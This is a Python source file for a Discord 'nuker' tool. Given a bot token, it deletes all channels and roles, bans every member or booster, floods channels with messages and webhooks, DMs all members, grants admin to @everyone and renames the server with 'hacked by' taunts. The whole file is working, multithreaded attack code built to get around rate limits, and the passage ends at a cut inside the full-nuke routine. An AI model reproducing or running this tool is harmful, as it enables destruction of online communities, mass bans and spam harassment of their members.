# language: Python, file: main.py, target: Windows 11, Python 3.10+
import sys, os, shutil

missing_modules = []

with open("requirements.txt", "r") as file:
    lines = [i.strip() for i in file.readlines()]

for line in lines:
    if "==" in line:
        module = line.split("==")[0]
    else:
        module = line
    try:
        __import__(module)
    except ModuleNotFoundError:
        missing_modules.append(module)
else:
    if len(missing_modules) != 0:
        print("Missing modules: " + ", ".join(missing_modules))
        i = input("Do you want to install them? [y,n]: ")
        if i.lower().strip().startswith("y"):
            os.system("pip install " + " ".join(missing_modules))
        else:
            print("Goodbye!")
            sys.exit()

# ========================= MAIN MODULES =========================================
import requests as req, time, json, base64
from pystyle import *
from colorama import Fore
from threading import Thread, Lock
import asyncio
from random import choice as random_choice, randint

# ========================= CLASSES ==============================================
from Plugins.logger import Logger
from Plugins.tools import Tools, init_proxies, prime_permission_cache
from Plugins.nuking import Nuking
from Plugins.funcs import Funcs
from Plugins.colors import Palette

# ========================= CONFIG ===============================================
Threads      = 40
print_lock   = Lock()
BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH  = os.path.join(BASE_DIR, "config.json")
WEBHOOK_CACHE_FILE = os.path.join(BASE_DIR, "webhook_cache.json")

class WorkController:
    @staticmethod
    def seperate(items, load_count):
        loads = [[] for _ in range(load_count)]
        for x in range(len(items)):
            loads[x % load_count].append(items[x])
        return [load for load in loads if len(load) > 0]

# ========================= ASCII TABLE ==========================================
class AsciiTable:
    def __init__(self, show_dividers=True):
        self.columns = []
        self.rows = []
        self.show_dividers = show_dividers

    def add_column(self, header):
        self.columns.append(str(header))

    def add_row(self, *cells):
        if len(cells) > len(self.columns):
            raise ValueError("Too many columns!")
        self.rows.append([str(cell) for cell in cells])

    def render(self):
        if not self.columns:
            return ""
        rows = [row + [""] * (len(self.columns) - len(row)) for row in self.rows]
        width = max(
            [len(x) for x in self.columns]
            + [len(cell) for row in rows for cell in row]
            + [0]
        ) + 4
        count = len(self.columns)

        def border(left, middle, right):
            return left + middle.join(["═" * (width - 1)] * count) + right

        def format_row(cells):
            cells = [cell + " " * max(0, width - len(cell) - 3) for cell in cells]
            return "║ " + " ║ ".join(cells) + " ║"

        output = [border("╔", "╦", "╗"), format_row(self.columns)]
        for row in rows:
            if self.show_dividers:
                output.append(border("╠", "╬", "╣"))
            output.append(format_row(row))
        output.append(border("╚", "╩", "╝"))
        return "\n".join(output)

    def write(self):
        print(self.render())

# ========================= VARS =================================================
global_timeot   = 0.0002
palette         = Palette()
token           = None
names           = None
amount          = None
guild_name      = None
invite_link     = None
info            = None

# ========================= HELPERS ==============================================
def check_exit(val):
    if str(val).strip() == "0":
        input(Fore.WHITE + "\n>> Press ENTER to exit <<")
        os._exit(0)
    return val

def palette_print(text: str, theme: str = "ocean"):
    """Print with our gradient palette — ocean / emerald / crimson."""
    fn = getattr(palette, theme, palette.ocean)
    print(fn(text))

def _load_webhook_cache() -> dict:
    """Load { guild_id: { channel_id: webhook_url } } from file."""
    if os.path.exists(WEBHOOK_CACHE_FILE):
        try:
            with open(WEBHOOK_CACHE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_webhook_cache(cache: dict):
    try:
        with open(WEBHOOK_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(cache, f, indent=2)
    except Exception:
        pass

# ========================= MAIN =================================================
async def main(token: str, guild_id, page: int = 1):
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type":  "application/json",
        "X-Audit-Log-Reason": "vanta runs you"
    }

    System.Clear()
    Funcs.print_logo()
    global info

    if not info:
        info = Tools.information(guild_id, token)

    term_width = shutil.get_terminal_size().columns

    def center_block(text: str) -> str:
        lines = text.split("\n")
        return "\n".join(
            " " * max(0, (term_width - len(line)) // 2) + line
            for line in lines
        )

    print(center_block(" > if i play, i play to win. ; blood)s\n"))

    version_table = AsciiTable()
    version_table.add_column("Version - 2.0.8080.31430")
    version_table.add_column("Core version - 2.0.8080.28181")

    nuker = Nuking(token, guild_id)

    if page == 1:
        menu_table = AsciiTable()
        menu_table.add_column("1 - Delete All Channels")
        menu_table.add_column("2 - Create Channels")
        menu_table.add_column("3 - Delete All Roles")
        menu_table.add_row("4 - Create Roles", "5 - Ban All Members", "6 - Message Spam Channels")
        menu_table.add_row("7 - Change Guild Name", "8 - Change Guild Icon", "9 - Webhook Spam Channels")
        choice_mapping = {
            "1": "01", "2": "05", "3": "02",
            "4": "06", "5": "03", "6": "09",
            "7": "14", "8": "15", "9": "08",
            "0": "exit"
        }
    else:
        menu_table = AsciiTable()
        menu_table.add_column("1 - Change Vanity Link")
        menu_table.add_column("2 - Ban All Booster")
        menu_table.add_column("3 - Dm All Members")
        menu_table.add_row("4 - Nuke Guild Completely", "5 - Server Prune", "6 - Delete All Emojis")
        menu_table.add_row("7 - Give Admin to @everyone", "8 - Rename All Channels", "0 - Exit")
        choice_mapping = {
            "1": "16", "2": "17", "3": "18",
            "4": "19", "5": "20", "6": "21",
            "7": "22", "8": "23", "0": "exit"
        }

    async def back_to_manu(target_page=page):
        input(palette.ocean("\n!! PRESS ENTER TO RETURN TO MENU !!\n"))
        return await main(token, guild_id, target_page)

    print(palette.ocean(center_block(version_table.render())))
    print(palette.ocean(center_block(menu_table.render())))
    print()

    raw_choice = check_exit(input(Fore.WHITE + "Choice : ").strip())

    if raw_choice == "":
        next_page = 2 if page == 1 else 1
        return await main(token, guild_id, next_page)

    choice_val = choice_mapping.get(raw_choice)
    if choice_val == "exit":
        input(palette.ocean("\n>> Press ENTER to exit <<"))
        os._exit(0)
    if not choice_val:
        return await main(token, guild_id, page)

    print()

    # ── 1 - Delete All Channels ─────────────────────────────────────────────────
    if choice_val == "01":
        if not Tools.has_permission(guild_id, headers, "MANAGE_CHANNELS"):
            Logger.Error.error("Bot lacks permission: MANAGE_CHANNELS")
            return await back_to_manu()

        url = Tools.api(f"guilds/{guild_id}/channels")
        req_ = Tools.request("get", url, headers=headers)
        if req_.status_code != 200:
            Logger.Error.error(f"Failed to fetch channels: {Tools.get_detailed_error(req_)}")
            return await back_to_manu()

        channels = req_.json()
        if not channels:
            Logger.Error.error("No channels found in this guild.")
            return await back_to_manu()

        all_loads = WorkController.seperate(channels, Threads)
        finished_loads = 0

        def deleter_worker(load):
            nonlocal finished_loads
            for channel in load:
                chan_id, chan_name = channel["id"], channel["name"]
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        res = Tools.request("delete", Tools.api(f"channels/{chan_id}"), headers=headers, timeout=5)
                        if res.status_code in [200, 204]:
                            with print_lock: Logger.Success.delete(f"#{chan_name}", chan_id)
                            break
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            with print_lock: Logger.Error.delete(f"#{chan_name}", Tools.get_detailed_error(res))
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.delete(f"#{chan_name}", str(e))
                        time.sleep(1)
                time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=deleter_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 3 - Delete All Roles ─────────────────────────────────────────────────────
    elif choice_val == "02":
        if not Tools.has_permission(guild_id, headers, "MANAGE_ROLES"):
            Logger.Error.error("Bot lacks permission: MANAGE_ROLES")
            return await back_to_manu()

        req_ = Tools.request("get", Tools.api(f"guilds/{guild_id}/roles"), headers=headers)
        if req_.status_code != 200:
            Logger.Error.error(f"Failed to fetch roles: {Tools.get_detailed_error(req_)}")
            return await back_to_manu()

        roles = [r for r in req_.json() if r.get("name") != "@everyone"]
        if not roles:
            Logger.Error.error("No roles found in this guild.")
            return await back_to_manu()

        all_loads = WorkController.seperate(roles, Threads)
        finished_loads = 0

        def delete_role_worker(load):
            nonlocal finished_loads
            for role in load:
                rid, rname = role["id"], role["name"]
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        res = Tools.request("delete", Tools.api(f"guilds/{guild_id}/roles/{rid}"), headers=headers, timeout=5)
                        if res.status_code in [200, 204]:
                            with print_lock: Logger.Success.delete(f"@{rname}", rid)
                            break
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            with print_lock: Logger.Error.delete(f"@{rname}", Tools.get_detailed_error(res))
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.delete(f"@{rname}", str(e))
                        time.sleep(1)
                time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=delete_role_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 5 - Ban All Members ──────────────────────────────────────────────────────
    elif choice_val == "03":
        if not Tools.has_permission(guild_id, headers, "BAN_MEMBERS"):
            Logger.Error.error("Bot lacks permission: BAN_MEMBERS")
            return await back_to_manu()

        use_bulk = check_exit(input(Fore.WHITE + "Use Bulk Ban? (200 users/request, faster) [y/n]: ")).strip().lower()

        raw_members = await Tools.break_limit(Tools.api(f"guilds/{guild_id}/members"), token)
        if not raw_members:
            Logger.Error.error("Failed to fetch members or Server Members Intent is disabled.")
            return await back_to_manu()

        members = []
        for obj in raw_members:
            try:
                if isinstance(obj, dict):
                    uid = obj.get("user", {}).get("id") or obj.get("id")
                    if uid: members.append(str(uid))
            except Exception:
                pass

        if not members:
            Logger.Error.error("No valid member IDs extracted.")
            return await back_to_manu()

        palette_print(f"[~] {len(members)} member(s) fetched. Banning...", "ocean")

        if use_bulk == "y":
            # ── Bulk ban: 200 per request, requires BAN_MEMBERS + MANAGE_GUILD ───
            if not Tools.has_permission(guild_id, headers, "MANAGE_GUILD"):
                Logger.Error.error("Bulk ban requires MANAGE_GUILD permission too.")
                return await back_to_manu()

            BULK_SIZE    = 200
            chunks       = [members[i:i + BULK_SIZE] for i in range(0, len(members), BULK_SIZE)]
            bulk_url     = Tools.api(f"guilds/{guild_id}/bulk-ban")
            total_banned = 0
            total_failed = 0

            for idx, chunk in enumerate(chunks):
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        res = Tools.request(
                            "post", bulk_url,
                            headers=headers,
                            json={"user_ids": chunk, "delete_message_seconds": 0},
                            timeout=15
                        )
                        if res.status_code in [200, 201]:
                            data = res.json()
                            for uid in data.get("banned_users", []):
                                Logger.Success.success(f"Banned {uid}")
                                total_banned += 1
                            for uid in data.get("failed_users", []):
                                Logger.Error.ban(f"User {uid}", "Failed in bulk")
                                total_failed += 1
                            break
                        elif res.status_code == 429:
                            try:
                                retry_after = float(res.json().get("retry_after", 1))
                            except Exception:
                                retry_after = 1.0
                            time.sleep(retry_after)
                            continue
                        else:
                            Logger.Error.error(
                                f"Bulk [{idx+1}/{len(chunks)}] failed: {Tools.get_detailed_error(res)}"
                            )
                            break
                    except Exception as e:
                        if tries >= 3:
                            Logger.Error.error(f"Bulk [{idx+1}/{len(chunks)}] error: {e}")
                        time.sleep(1)
                time.sleep(global_timeot)

            Logger.Success.success(f"Bulk ban done — Total banned: {total_banned} | Total failed: {total_failed}")

        else:
            # ── Normal ban: one request per user, threaded ───────────────────────
            all_loads = WorkController.seperate(members, Threads)
            finished_loads = 0

            def ban_worker(load):
                nonlocal finished_loads
                load = list(load)
                while load:
                    member = load[0]
                    tries = 0
                    success = False
                    while tries < 3 and not success:
                        tries += 1
                        try:
                            res = Tools.request("put", Tools.api(f"guilds/{guild_id}/bans/{member}"),
                                                headers=headers, json={"delete_message_days": 0}, timeout=5)
                            if res.status_code in [200, 204]:
                                with print_lock: Logger.Success.success(f"Banned {member}")
                                success = True
                            elif res.status_code == 429:
                                time.sleep(float(res.json().get("retry_after", 1)))
                            else:
                                with print_lock: Logger.Error.ban(f"User {member}", Tools.get_detailed_error(res))
                                break
                        except Exception as e:
                            if tries >= 3:
                                with print_lock: Logger.Error.ban(f"User {member}", str(e))
                            time.sleep(1)
                    load.pop(0)
                    time.sleep(global_timeot)
                finished_loads += 1

            for load in all_loads:
                Thread(target=ban_worker, args=(load,)).start()
            while finished_loads < len(all_loads):
                time.sleep(0.05)

        return await back_to_manu()

    # ── 2 - Create Channels ──────────────────────────────────────────────────────
    elif choice_val == "05":
        if not Tools.has_permission(guild_id, headers, "MANAGE_CHANNELS"):
            Logger.Error.error("Bot lacks permission: MANAGE_CHANNELS")
            return await back_to_manu()

        name         = check_exit(input(Fore.WHITE + "Enter a name for channels: "))
        count        = min(400, int(check_exit(input(Fore.WHITE + "How many channels? [1,500]: "))))
        channel_type = check_exit(input(Fore.WHITE + "Channel type [text, voice]: ")).lower().strip()
        chantype     = {"voice": 2, "text": 0}.get(channel_type, 0)

        all_loads = WorkController.seperate([None] * count, Threads)
        finished_loads = 0

        def create_channel_worker(load):
            nonlocal finished_loads
            for _ in load:
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        res = Tools.request("post", Tools.api(f"guilds/{guild_id}/channels"),
                                            headers=headers, json={"name": name, "type": chantype}, timeout=5)
                        if res.status_code in [200, 201]:
                            d = res.json()
                            with print_lock: Logger.Success.create(f"#{d['name']}", d['id'])
                            break
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            with print_lock: Logger.Error.create(f"#{name}", Tools.get_detailed_error(res))
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.create(f"#{name}", str(e))
                        time.sleep(1)
                time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=create_channel_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 4 - Create Roles ─────────────────────────────────────────────────────────
    elif choice_val == "06":
        if not Tools.has_permission(guild_id, headers, "MANAGE_ROLES"):
            Logger.Error.error("Bot lacks permission: MANAGE_ROLES")
            return await back_to_manu()

        name  = check_exit(input(Fore.WHITE + "Enter a name for roles: "))
        count = int(check_exit(input(Fore.WHITE + "How many roles? [1,250]: ")))

        all_loads = WorkController.seperate([None] * count, Threads)
        finished_loads = 0

        def create_role_worker(load):
            nonlocal finished_loads
            for _ in load:
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        rc = (randint(0,255), randint(0,255), randint(0,255))
                        color_int = rc[0]*65536 + rc[1]*256 + rc[2]
                        res = Tools.request("post", Tools.api(f"guilds/{guild_id}/roles"),
                                            headers=headers, json={"name": name, "color": color_int}, timeout=5)
                        if res.status_code in [200, 201]:
                            d = res.json()
                            with print_lock: Logger.Success.create(f"@{d['name']}", d['id'])
                            break
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            with print_lock: Logger.Error.create(f"@{name}", Tools.get_detailed_error(res))
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.create(f"@{name}", str(e))
                        time.sleep(1)
                time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=create_role_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 9 - Webhook Spam Channels ────────────────────────────────────────────────
    elif choice_val == "08":
        if not Tools.has_permission(guild_id, headers, "MANAGE_WEBHOOKS"):
            Logger.Error.error("Bot lacks permission: MANAGE_WEBHOOKS")
            return await back_to_manu()

        req_ = Tools.request("get", Tools.api(f"guilds/{guild_id}/channels"), headers=headers)
        if req_.status_code != 200:
            Logger.Error.error(f"Failed to fetch channels: {Tools.get_detailed_error(req_)}")
            return await back_to_manu()

        channels = [c for c in req_.json() if c.get("type", 0) == 0]
        if not channels:
            Logger.Error.error("No text channels found.")
            return await back_to_manu()

        message = check_exit(input(Fore.WHITE + "Enter spam message: "))
        count   = int(check_exit(input(Fore.WHITE + "How many times per channel? [1, ∞]: ")))

        avatar_data = None
        avatar_path = os.path.join(BASE_DIR, "avatar.png")
        if os.path.exists(avatar_path):
            with open(avatar_path, "rb") as f:
                avatar_data = f"data:image/png;base64,{base64.b64encode(f.read()).decode()}"

        wh_name = " > if i play, i play to win. ; blood)s"

        # ── Webhook cache: reuse existing, create only on first run ──────────────
        all_caches = _load_webhook_cache()
        guild_key  = str(guild_id)
        wh_map: dict = all_caches.get(guild_key, {})   # { channel_id: url }
        is_first_run = not wh_map

        # Find webhooks we don't have yet
        channels_needing_wh = [c for c in channels if c["id"] not in wh_map]

        if channels_needing_wh:
            create_lock = Lock()
            wh_loads    = WorkController.seperate(channels_needing_wh, Threads)
            wh_finished = 0

            def create_wh_worker(load):
                nonlocal wh_finished
                for chan in load:
                    cid  = chan["id"]
                    cname = chan.get("name", cid)
                    payload = {"name": wh_name}
                    if avatar_data:
                        payload["avatar"] = avatar_data
                    tries = 0
                    while tries < 3:
                        tries += 1
                        try:
                            res = Tools.request("post", Tools.api(f"channels/{cid}/webhooks"),
                                                headers=headers, json=payload, timeout=5)
                            if res.status_code in [200, 201]:
                                url = res.json().get("url")
                                if url:
                                    with create_lock:
                                        wh_map[cid] = url
                                    with print_lock:
                                        Logger.Success.create(f"Webhook #{cname}", cid)
                                break
                            elif res.status_code == 429:
                                time.sleep(float(res.json().get("retry_after", 1)))
                            else:
                                with print_lock:
                                    Logger.Error.create(f"Webhook #{cname}", Tools.get_detailed_error(res))
                                break
                        except Exception as e:
                            if tries >= 3:
                                with print_lock:
                                    Logger.Error.create(f"Webhook #{cname}", str(e))
                            time.sleep(1)
                wh_finished += 1

            for load in wh_loads:
                Thread(target=create_wh_worker, args=(load,)).start()
            while wh_finished < len(wh_loads):
                time.sleep(0.05)

            # Save updated cache
            all_caches[guild_key] = wh_map
            _save_webhook_cache(all_caches)

        if not wh_map:
            Logger.Error.error("Failed to create or load any webhooks.")
            return await back_to_manu()

        if not is_first_run:
            palette_print(f"[~] Loaded {len(wh_map)} cached webhooks from {os.path.basename(WEBHOOK_CACHE_FILE)}", "ocean")
        else:
            palette_print(f"[~] Created {len(wh_map)} webhooks.", "emerald")

        # ── Spam ────────────────────────────────────────────────────────────────
        wh_items    = list(wh_map.items())          # [(channel_id, url), ...]
        spam_loads  = WorkController.seperate(wh_items, Threads)
        sp_finished = 0

        def spam_worker(load):
            nonlocal sp_finished
            for cid, url in load:
                for _ in range(count):
                    tries = 0
                    while tries < 3:
                        tries += 1
                        try:
                            r = Tools.request("post", url, json={"content": message}, timeout=5)
                            if r.status_code in [200, 204]:
                                with print_lock:
                                    Logger.Success.success(f"Sent -> #{cid} : {message}")
                                break
                            elif r.status_code == 429:
                                time.sleep(float(r.json().get("retry_after", 1)))
                            else:
                                break
                        except Exception:
                            time.sleep(1)
                    time.sleep(global_timeot)
            sp_finished += 1

        for load in spam_loads:
            Thread(target=spam_worker, args=(load,)).start()
        while sp_finished < len(spam_loads):
            time.sleep(0.05)

        return await back_to_manu()

    # ── 6 - Message Spam Guild ───────────────────────────────────────────────────
    elif choice_val == "09":
        if not Tools.has_permission(guild_id, headers, "SEND_MESSAGES"):
            Logger.Error.error("Bot lacks permission: SEND_MESSAGES")
            return await back_to_manu()

        req_ = Tools.request("get", Tools.api(f"guilds/{guild_id}/channels"), headers=headers)
        if req_.status_code != 200:
            Logger.Error.error(f"Failed to fetch channels: {Tools.get_detailed_error(req_)}")
            return await back_to_manu()

        channels = [c for c in req_.json() if c.get("type", 0) == 0]
        if not channels:
            Logger.Error.error("No text channels found.")
            return await back_to_manu()

        message = check_exit(input(Fore.WHITE + "Enter spam message: "))
        count   = int(check_exit(input(Fore.WHITE + "How many times? [1, ∞]: ")))

        all_loads = WorkController.seperate(channels, Threads)
        finished_loads = 0

        def send_message_worker(load):
            nonlocal finished_loads
            for _ in range(count):
                for chan in load:
                    cid, cname = chan["id"], chan["name"]
                    tries = 0
                    while tries < 3:
                        tries += 1
                        try:
                            res = Tools.request("post", Tools.api(f"channels/{cid}/messages"),
                                                headers=headers, json={"content": message}, timeout=5)
                            if res.status_code in [200, 201]:
                                with print_lock: Logger.Success.success(f"Message sent {message} [{cid}]")
                                break
                            elif res.status_code == 429:
                                time.sleep(float(res.json().get("retry_after", 1)))
                            else:
                                with print_lock: Logger.Error.delete(f"Message in #{cname}", Tools.get_detailed_error(res))
                                break
                        except Exception as e:
                            if tries >= 3:
                                with print_lock: Logger.Error.delete(f"Message in #{cname}", str(e))
                            time.sleep(1)
                    time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=send_message_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 7 - Change Guild Name ────────────────────────────────────────────────────
    elif choice_val == "14":
        if not Tools.has_permission(guild_id, headers, "MANAGE_GUILD"):
            Logger.Error.error("Bot lacks permission: MANAGE_GUILD")
            return await back_to_manu()

        name = check_exit(input(Fore.WHITE + "Enter a new name for guild: "))
        if nuker.rename_guild(name):
            Logger.Success.success(f"Changed Guild name to {name}")
        else:
            Logger.Error.change("Guild Name")
        return await back_to_manu()

    # ── 8 - Change Guild Icon ────────────────────────────────────────────────────
    elif choice_val == "15":
        if not Tools.has_permission(guild_id, headers, "MANAGE_GUILD"):
            Logger.Error.error("Bot lacks permission: MANAGE_GUILD")
            return await back_to_manu()

        Cursor.HideCursor()
        if nuker.change_guild_icon():
            Logger.Success.success("Changed Guild icon from avatar.png")
        else:
            Logger.Error.change("Guild Icon")
        Cursor.ShowCursor()
        return await back_to_manu()

    # ── 1 (p2) - Change Vanity Link ──────────────────────────────────────────────
    elif choice_val == "16":
        if not Tools.has_permission(guild_id, headers, "MANAGE_GUILD"):
            Logger.Error.error("Bot lacks permission: MANAGE_GUILD")
            return await back_to_manu()

        guild_info = Tools.request("get", Tools.api(f"guilds/{guild_id}"), headers=headers)
        if guild_info.status_code == 200:
            if "VANITY_URL" not in guild_info.json().get("features", []):
                Logger.Error.error("Server hasn't reached Level 3 boost for vanity URL.")
                return await back_to_manu()

        new_vanity = check_exit(input(Fore.WHITE + "Enter new vanity link code: ")).strip()
        if nuker.change_vanity(new_vanity):
            Logger.Success.success(f"Changed vanity to discord.gg/{new_vanity}")
        else:
            Logger.Error.error("Failed to change vanity. Code may be taken.")
        return await back_to_manu()

    # ── 2 (p2) - Ban All Booster ─────────────────────────────────────────────────
    elif choice_val == "17":
        if not Tools.has_permission(guild_id, headers, "BAN_MEMBERS"):
            Logger.Error.error("Bot lacks permission: BAN_MEMBERS")
            return await back_to_manu()

        raw_members = await Tools.break_limit(Tools.api(f"guilds/{guild_id}/members"), token)
        if not raw_members:
            Logger.Error.error("Failed to fetch members or Members Intent is disabled.")
            return await back_to_manu()

        boosters = []
        for m in raw_members:
            try:
                if isinstance(m, dict) and m.get("premium_since") is not None:
                    uid = m.get("user", {}).get("id") or m.get("id")
                    if uid: boosters.append(str(uid))
            except Exception:
                pass

        if not boosters:
            Logger.Error.error("No active boosters found.")
            return await back_to_manu()

        palette_print(f"[~] Found {len(boosters)} booster(s). Banning...", "ocean")

        all_loads = WorkController.seperate(boosters, Threads)
        finished_loads = 0

        def ban_booster_worker(load):
            nonlocal finished_loads
            load = list(load)
            while load:
                member = load[0]
                tries = 0
                success = False
                while tries < 3 and not success:
                    tries += 1
                    try:
                        res = Tools.request("put", Tools.api(f"guilds/{guild_id}/bans/{member}"),
                                            headers=headers, json={"delete_message_days": 0}, timeout=5)
                        if res.status_code in [200, 204]:
                            with print_lock: Logger.Success.success(f"Banned Booster {member}")
                            success = True
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            with print_lock: Logger.Error.ban(f"Booster {member}", Tools.get_detailed_error(res))
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.ban(f"Booster {member}", str(e))
                        time.sleep(1)
                load.pop(0)
                time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=ban_booster_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 3 (p2) - DM All Members ──────────────────────────────────────────────────
    elif choice_val == "18":
        if not Tools.has_permission(guild_id, headers, "SEND_MESSAGES"):
            Logger.Error.error("Bot lacks permission: SEND_MESSAGES")
            return await back_to_manu()

        dm_target = check_exit(input(Fore.WHITE + "Target [all / online]: ")).strip().lower()
        if dm_target not in ("all", "online"):
            Logger.Error.error("Invalid choice. Enter 'all' or 'online'.")
            return await back_to_manu()

        message = check_exit(input(Fore.WHITE + "Enter DM message: "))
        if not message or len(message) > 4000:
            Logger.Error.error("Invalid message content.")
            return await back_to_manu()

        if dm_target == "online":
            # /guilds/{id}/members/search doesn't filter by presence;
            # use the presence endpoint via GET /guilds/{id}/members/online (requires GUILD_PRESENCES intent)
            # Fallback: fetch all and filter by status from /guilds/{id}/presences
            presence_res = Tools.request("get", Tools.api(f"guilds/{guild_id}?with_counts=true"),
                                         headers=headers)
            # Try fetching presences directly
            pres_res = Tools.request("get", Tools.api(f"guilds/{guild_id}/presences"),
                                     headers=headers)
            if pres_res.status_code == 200:
                presences = pres_res.json()
                online_ids = set()
                for p in presences:
                    if p.get("status") in ("online", "idle", "dnd"):
                        try:
                            uid = p.get("user", {}).get("id")
                            if uid: online_ids.add(str(uid))
                        except Exception:
                            pass
                raw_members = await Tools.break_limit(Tools.api(f"guilds/{guild_id}/members"), token)
                member_ids = []
                for obj in raw_members:
                    try:
                        uid = obj.get("user", {}).get("id") or obj.get("id")
                        if uid and str(uid) in online_ids:
                            member_ids.append(str(uid))
                    except Exception:
                        pass
            else:
                # presences endpoint not available — fall back to all
                palette_print("[~] Presences unavailable, falling back to all members.", "ocean")
                raw_members = await Tools.break_limit(Tools.api(f"guilds/{guild_id}/members"), token)
                member_ids = []
                for obj in raw_members:
                    try:
                        uid = obj.get("user", {}).get("id") or obj.get("id")
                        if uid: member_ids.append(str(uid))
                    except Exception:
                        pass
        else:
            raw_members = await Tools.break_limit(Tools.api(f"guilds/{guild_id}/members"), token)
            if not raw_members:
                Logger.Error.error("Failed to fetch members.")
                return await back_to_manu()
            member_ids = []
            for obj in raw_members:
                try:
                    uid = obj.get("user", {}).get("id") or obj.get("id")
                    if uid: member_ids.append(str(uid))
                except Exception:
                    pass

        if not member_ids:
            Logger.Error.error("No valid member IDs found.")
            return await back_to_manu()

        palette_print(f"[~] DMing {len(member_ids)} member(s)...", "ocean")

        all_loads = WorkController.seperate(member_ids, Threads)
        finished_loads = 0

        def dm_worker(load):
            nonlocal finished_loads
            for user in load:
                if nuker.send_direct_message(user, message):
                    with print_lock: Logger.Success.success(f"Sent DM to {user}")
                else:
                    with print_lock: Logger.Error.error(f"Failed DM to {user}")
                time.sleep(global_timeot + 0.5)
            finished_loads += 1

        for load in all_loads:
            Thread(target=dm_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)
        return await back_to_manu()

    # ── 4 (p2) - Nuke Guild Completely ───────────────────────────────────────────
    elif choice_val == "19":
        if not Tools.has_permission(guild_id, headers, "MANAGE_CHANNELS") or \
           not Tools.has_permission(guild_id, headers, "MANAGE_GUILD"):
            Logger.Error.error("Bot lacks permission: MANAGE_CHANNELS / MANAGE_GUILD")
            return await back_to_manu()

        base_name = check_exit(input(Fore.WHITE + "Base name for channels & server (e.g. magrh): ")).strip() or "vanta"
        try:
            chan_count = max(1, min(500, int(check_exit(input(Fore.WHITE + "How many channels? [1-500]: ")))))
        except Exception:
            chan_count = 50
        spam_msg = check_exit(input(Fore.WHITE + "Spam message content: ")).strip() or "Server Nuked"
        try:
            spam_amt = max(1, min(100, int(check_exit(input(Fore.WHITE + "Messages per channel? [1-100]: ")))))
        except Exception:
            spam_amt = 30

        names_pool = [
            f"bypass b2y {base_name}", f"{base_name} was here",
            f"ha2cked b2y {base_name}", f"{base_name} runs you",
            f"{base_name} wizzed you",  f"rapped b2y {base_name}"
        ]
        srv_name = random_choice(names_pool)

        # ── Step 1: Delete all channels ─────────────────────────────────────────
        palette_print("[*] Deleting all channels...", "crimson")
        chan_res = Tools.request("get", Tools.api(f"guilds/{guild_id}/channels"), headers=headers)
        del_finished = 0
        del_loads = []
        if chan_res.status_code == 200 and chan_res.json():
            del_loads = WorkController.seperate(chan_res.json(), Threads)
            def del_worker(load):
                nonlocal del_finished
                for ch in load:
                    try:
                        Tools.request("delete", Tools.api(f"channels/{ch['id']}"), headers=headers, timeout=5)
                        with print_lock: Logger.Success.delete(f"#{ch['name']}", ch['id'])
                    except Exception:
                        pass
                    time.sleep(global_timeot)
                del_finished += 1
            for load in del_loads:
                Thread(target=del_worker, args=(load,)).start()

        # ── Step 2+3: Create channels + rename server + change icon — concurrent ─
        palette_print(f"[*] Creating {chan_count} channels + renaming server in parallel...", "ocean")

        created_channel_ids: list = []
        create_lock2 = Lock()
        create_finished = 0
        chan_slots = WorkController.seperate([None] * chan_count, Threads)

        def create_nuke_chan(load):
            nonlocal create_finished
            for _ in load:
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        c_name = random_choice(names_pool)
                        res = Tools.request("post", Tools.api(f"guilds/{guild_id}/channels"),
                                            headers=headers, json={"name": c_name, "type": 0}, timeout=5)
                        if res.status_code in [200, 201]:
                            cid = res.json()["id"]
                            with create_lock2:
                                created_channel_ids.append(cid)
                            with print_lock: Logger.Success.create(f"#{c_name}", cid)
                            break
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            break
                    except Exception:
                        time.sleep(1)
                time.sleep(global_timeot)
            create_finished += 1

        # Rename + icon in a background thread while channels are being created
        rename_done = [False]
        def rename_and_icon():
            if nuker.rename_guild(srv_name):
                with print_lock: Logger.Success.success(f"Server renamed to {srv_name}")
            else:
                with print_lock: Logger.Error.change("Guild Name")
            if nuker.change_guild_icon():
                with print_lock: Logger.Success.success("Guild icon updated")
            else:
